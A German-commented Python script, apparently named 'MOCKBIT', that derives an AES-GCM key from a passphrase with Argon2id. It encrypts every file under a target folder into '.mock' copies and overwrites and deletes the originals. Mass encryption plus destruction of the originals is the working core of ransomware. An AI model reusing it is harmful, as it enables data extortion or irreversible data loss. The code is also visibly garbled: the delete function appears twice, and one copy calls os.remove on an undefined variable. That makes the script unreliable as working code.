import os
import json
import base64
import getpass
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from argon2.low_level import hash_secret_raw, Type

# Zielordner anpassen!
START_PATH = "folder"
KEY_FILENAME = "MOCKBIT_KEY.txt"
NONCE_SIZE = 12  # Bytes for AES-GCM nonce
SALT_SIZE = 16  # Bytes for Argon2 salt
ARGON2_TIME = 2         # Number of iterations
ARGON2_MEMORY = 102400  # Memory cost in kibibytes
ARGON2_PARALLELISM = 8  # Degree of parallelism

def encrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        data = f.read()
    nonce = get_random_bytes(NONCE_SIZE)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ct_bytes, tag = cipher.encrypt_and_digest(data)
    with open(file_path + ".mock", "wb") as f:
        f.write(nonce + tag + ct_bytes)
    secure_delete(file_path)
def secure_delete(path):
    """Overwrite the file with random bytes before removing it."""
    try:
        length = os.path.getsize(path)
        with open(path, "wb") as f:
            f.write(get_random_bytes(length))
            f.flush()
            os.fsync(f.fileno())
    except Exception as e:
        print("Sicheres Löschen fehlgeschlagen für", path, e)
    finally:
        try:
            os.remove(path)
        except Exception:
            pass
def secure_delete(path):
    """Overwrite the file with random bytes before removing it."""
    try:
        length = os.path.getsize(path)
        with open(path, "wb") as f:
            f.write(get_random_bytes(length))
            f.flush()
            os.fsync(f.fileno())
    except Exception as e:
        print("Sicheres Löschen fehlgeschlagen für", path, e)
    finally:
        try:
            os.remove(path)
        except Exception:
            pass
    os.remove(file_path)
def find_and_encrypt_all_files(path, key):
    for dirpath, _, files in os.walk(path):
        for name in files:
            file_path = os.path.join(dirpath, name)
            if name.endswith(".mock") or name == KEY_FILENAME:
                continue
            try:
                encrypt_file(file_path, key)
                print("Verschlüsselt:", file_path)
            except Exception as e:
                print("Fehler bei", file_path, e)

if __name__ == "__main__":
    passphrase = getpass.getpass("Bitte Passphrase zum Verschlüsseln eingeben:\n")
    salt = get_random_bytes(SALT_SIZE)
    key = hash_secret_raw(
        secret=passphrase.encode(),
        salt=salt,
        time_cost=ARGON2_TIME,
        memory_cost=ARGON2_MEMORY,
        parallelism=ARGON2_PARALLELISM,
        hash_len=32,
        type=Type.ID,
    )

    key_path = os.path.join(START_PATH, KEY_FILENAME)
    key_info = {
        "salt": base64.b64encode(salt).decode(),
        "time": ARGON2_TIME,
        "memory": ARGON2_MEMORY,
        "parallelism": ARGON2_PARALLELISM,
    }
    with open(key_path, "w") as f:
        json.dump(key_info, f)
    print(f"Parameter wurden in {key_path} gespeichert. Passphrase merken!")
    find_and_encrypt_all_files(START_PATH, key)
    print("Fertig.")
